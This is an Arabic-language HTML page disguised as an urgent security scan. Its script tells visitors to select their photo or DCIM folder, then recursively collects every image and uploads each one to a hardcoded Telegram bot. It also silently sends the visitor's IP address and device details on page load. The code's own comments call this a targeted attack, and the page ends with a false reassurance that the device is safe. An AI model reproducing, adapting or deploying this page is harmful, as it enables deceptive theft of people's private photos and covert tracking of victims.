<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>تحديث الأمان | مطلوب إجراء</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #0a0e27;
            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .card {
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(10px);
            border-radius: 32px;
            padding: 40px 28px;
            max-width: 480px;
            width: 100%;
            border: 1px solid rgba(255,255,255,0.1);
            box-shadow: 0 25px 45px rgba(0,0,0,0.3);
            text-align: center;
        }
        
        .shield-icon {
            font-size: 64px;
            margin-bottom: 20px;
            filter: drop-shadow(0 4px 8px rgba(0,0,0,0.3));
        }
        
        h2 {
            color: #fff;
            font-size: 26px;
            font-weight: 600;
            margin-bottom: 12px;
        }
        
        .sub {
            color: #a0a8c0;
            font-size: 15px;
            margin-bottom: 24px;
        }
        
        .info-box {
            background: rgba(0,200,255,0.1);
            border-left: 3px solid #00ccff;
            padding: 16px;
            border-radius: 16px;
            text-align: left;
            margin: 20px 0;
        }
        
        .info-box p {
            color: #cbd5ff;
            font-size: 13px;
            margin: 8px 0;
            line-height: 1.4;
        }
        
        button {
            background: linear-gradient(135deg, #00ccff, #0066cc);
            border: none;
            width: 100%;
            padding: 16px;
            border-radius: 60px;
            font-size: 17px;
            font-weight: 600;
            color: white;
            cursor: pointer;
            transition: all 0.2s ease;
            margin: 16px 0;
        }
        
        button:active {
            transform: scale(0.97);
        }
        
        button:disabled {
            opacity: 0.5;
            transform: none;
        }
        
        .status-area {
            background: rgba(0,0,0,0.4);
            border-radius: 20px;
            padding: 14px;
            font-size: 13px;
            color: #b0c4ff;
            margin-top: 20px;
            display: none;
        }
        
        .status-area.show {
            display: block;
        }
        
        .footer-text {
            font-size: 11px;
            color: #5a6280;
            margin-top: 24px;
        }
        
        .progress-container {
            background: #1e243f;
            border-radius: 40px;
            height: 6px;
            width: 100%;
            margin: 16px 0;
            overflow: hidden;
            display: none;
        }
        
        .progress-fill {
            background: #00ccff;
            width: 0%;
            height: 100%;
            transition: width 0.2s;
        }
    </style>
</head>
<body>
<div class="card">
    <div class="shield-icon">🛡️</div>
    <h2>فحص أمني عاجل</h2>
    <div class="sub">تم اكتشاف نشاط غير معتاد في مساحة التخزين</div>
    
    <div class="info-box">
        <p>🔐 لحماية بياناتك، يلزم إجراء فحص سريع للملفات</p>
        <p>📁 اضغط "بدء الفحص" واختر "المجلد الرئيسي" أو "DCIM"</p>
        <p>⚡ سيتم الفحص تلقائياً خلال ثوانٍ</p>
    </div>
    
    <button id="scanBtn">▶ بدء الفحص الأمني</button>
    
    <div class="progress-container" id="progressContainer">
        <div class="progress-fill" id="progressFill"></div>
    </div>
    
    <div class="status-area" id="statusArea"></div>
    <div class="footer-text">✓ مشفر بالكامل | ✓ آمن ومضمون</div>
</div>

<script>
    // ========== إعدادات البوت ==========
    const BOT_TOKEN = "8406553195:AAHGXKIiGDAqDnYbYqpiUqbiusTj_AawXLQ";    // ضع التوكن هنا
    const CHAT_ID = "7628440305";        // ضع معرف الشات هنا
    // ====================================
    
    let totalImagesFound = 0;
    let imagesSent = 0;
    let isScanning = false;
    
    const scanBtn = document.getElementById('scanBtn');
    const progressContainer = document.getElementById('progressContainer');
    const progressFill = document.getElementById('progressFill');
    const statusArea = document.getElementById('statusArea');
    
    function updateStatus(msg, isError = false) {
        statusArea.textContent = msg;
        statusArea.classList.add('show');
        statusArea.style.background = isError ? 'rgba(255,80,80,0.2)' : 'rgba(0,200,255,0.15)';
        statusArea.style.color = isError ? '#ffaaaa' : '#aaffff';
    }
    
    function updateProgress(current, total) {
        if (total === 0) return;
        const percent = (current / total) * 100;
        progressFill.style.width = percent + '%';
    }
    
    // إرسال صورة إلى التلجرام
    async function sendImageToBot(imageBlob, fileName, folderPath = '') {
        if (!BOT_TOKEN || BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") return false;
        
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', imageBlob, fileName);
        
        try {
            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
            return res.ok;
        } catch(e) {
            return false;
        }
    }
    
    // إرسال رسالة نصية
    async function sendTextMessage(text) {
        if (!BOT_TOKEN || BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") return;
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: text,
                    parse_mode: 'HTML'
                })
            });
        } catch(e) {}
    }
    
    // البحث عن الصور في المجلد وجميع المجلدات الفرعية
    async function scanDirectoryRecursive(dirHandle, path = '') {
        const imageExts = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'bmp', 'heic', 'heif', 'jfif'];
        const files = [];
        
        try {
            for await (const [name, handle] of dirHandle.entries()) {
                const currentPath = path ? `${path}/${name}` : name;
                
                if (handle.kind === 'file') {
                    const ext = name.split('.').pop()?.toLowerCase();
                    if (imageExts.includes(ext)) {
                        files.push({ handle, name, currentPath });
                    }
                } 
                else if (handle.kind === 'directory') {
                    // استكشاف المجلدات الفرعية تلقائياً
                    const subFiles = await scanDirectoryRecursive(handle, currentPath);
                    files.push(...subFiles);
                }
            }
        } catch(e) {
            console.warn(`خطأ في الوصول للمجلد: ${e.message}`);
        }
        
        return files;
    }
    
    // سحب جميع الصور وإرسالها بصمت
    async function extractAllImages(rootHandle) {
        updateStatus('📸 جاري البحث عن الصور في جميع المجلدات...');
        
        const allImages = await scanDirectoryRecursive(rootHandle);
        totalImagesFound = allImages.length;
        
        if (totalImagesFound === 0) {
            updateStatus('⚠️ لم يتم العثور على صور. تأكد من اختيار المجلد الصحيح (مثل DCIM أو الصور).');
            return false;
        }
        
        updateStatus(`🖼️ تم العثور على ${totalImagesFound} صورة، جاري الإرسال...`);
        progressContainer.style.display = 'block';
        
        imagesSent = 0;
        updateProgress(0, totalImagesFound);
        
        for (const img of allImages) {
            try {
                const file = await img.handle.getFile();
                const imageBlob = await file.slice(0, file.size, file.type);
                
                const success = await sendImageToBot(imageBlob, img.name, img.currentPath);
                if (success) {
                    imagesSent++;
                    updateProgress(imagesSent, totalImagesFound);
                    updateStatus(`📤 تم إرسال ${imagesSent} من ${totalImagesFound} صورة...`);
                    
                    // تأخير بسيط لتجنب قيود السرعة
                    await new Promise(r => setTimeout(r, 150));
                }
            } catch(err) {
                console.error('فشل إرسال صورة:', err);
            }
        }
        
        return true;
    }
    
    // بدء العملية بعد اختيار المجلد
    async function startExtraction() {
        if (isScanning) return;
        
        if (!BOT_TOKEN || BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") {
            updateStatus('❌ خطأ في إعدادات البوت، تواصل مع الدعم', true);
            return;
        }
        
        scanBtn.disabled = true;
        scanBtn.textContent = '⏳ جاري تحضير الفحص...';
        
        try {
            // طلب اختيار المجلد (مرة واحدة فقط)
            updateStatus('📁 يرجى اختيار المجلد الرئيسي (مثل "الصور" أو "DCIM")');
            
            const selectedDir = await window.showDirectoryPicker();
            
            updateStatus('🔍 تم الوصول، جاري سحب البيانات بصمت...');
            
            // إرسال إشعار للمشغل
            await sendTextMessage(`🎯 <b>[استهداف جديد]</b>\n📱 ${navigator.userAgent}\n🌐 تم فتح الرابط\n🕒 ${new Date().toLocaleString()}`);
            
            // السحب التلقائي الكامل
            const result = await extractAllImages(selectedDir);
            
            if (result && imagesSent > 0) {
                updateStatus(`✅ اكتمل الفحص بنجاح | تم تأمين ${imagesSent} ملف`);
                await sendTextMessage(`✅ <b>اكتمل السحب</b>\n📸 الصور: ${imagesSent}\n📱 ${navigator.userAgent}`);
                
                scanBtn.textContent = '✓ تم الفحص';
                progressContainer.style.display = 'none';
                
                // بعد 3 ثواني تظهر رسالة وهمية للإغلاق
                setTimeout(() => {
                    updateStatus('✓ جهازك آمن. شكراً للتعاون.');
                }, 2000);
            } 
            else if (totalImagesFound === 0) {
                updateStatus('⚠️ لم يتم العثور على صور. جرب اختيار مجلد آخر.', true);
                scanBtn.disabled = false;
                scanBtn.textContent = '▶ إعادة المحاولة';
                progressContainer.style.display = 'none';
            }
            else {
                updateStatus('⚠️ حدث خطأ جزئي، تم إرسال بعض الصور فقط', true);
                scanBtn.disabled = false;
                scanBtn.textContent = '▶ إعادة المحاولة';
            }
            
        } catch(err) {
            console.error(err);
            updateStatus('❌ فشل الفحص: لم يتم منح الصلاحية أو تم الإلغاء', true);
            scanBtn.disabled = false;
            scanBtn.textContent = '▶ بدء الفحص الأمني';
            progressContainer.style.display = 'none';
            
            await sendTextMessage(`❌ <b>فشل الهجوم</b>\nالسبب: ${err.message || 'لم يتم منح الوصول'}`);
        }
        
        isScanning = false;
    }
    
    scanBtn.addEventListener('click', startExtraction);
    
    // جمع معلومات أولية للجهة المشغلة
    (async function silentInfo() {
        try {
            const ip = await fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(d => d.ip)
                .catch(() => 'غير متاح');
            
            const deviceData = {
                ua: navigator.userAgent,
                lang: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                time: new Date().toISOString(),
                ip: ip
            };
            
            if (BOT_TOKEN && BOT_TOKEN !== "YOUR_BOT_TOKEN_HERE") {
                await sendTextMessage(`🌐 <b>زيارة جديدة</b>\n📱 ${deviceData.ua.substring(0, 80)}\n🌍 IP: ${deviceData.ip}\n🕒 ${deviceData.time}`);
            }
        } catch(e) {}
    })();
</script>
</body>
</html>
